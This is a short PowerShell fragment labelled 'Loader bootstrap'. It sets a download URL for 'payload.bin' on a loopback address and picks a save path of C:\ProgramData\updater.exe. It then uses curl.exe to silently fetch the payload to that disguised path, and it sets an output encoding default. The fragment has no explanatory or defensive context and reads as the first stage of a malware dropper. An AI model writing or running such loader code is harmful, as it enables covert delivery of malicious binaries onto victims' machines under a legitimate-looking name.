
<# Loader bootstrap #> $DownloadUrl = "https://127.0.0.1/payload.bin"; $WorkingPath = "C:\ProgramData\updater.exe"; curl.exe -s -L -o $WorkingPath $DownloadUrl; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
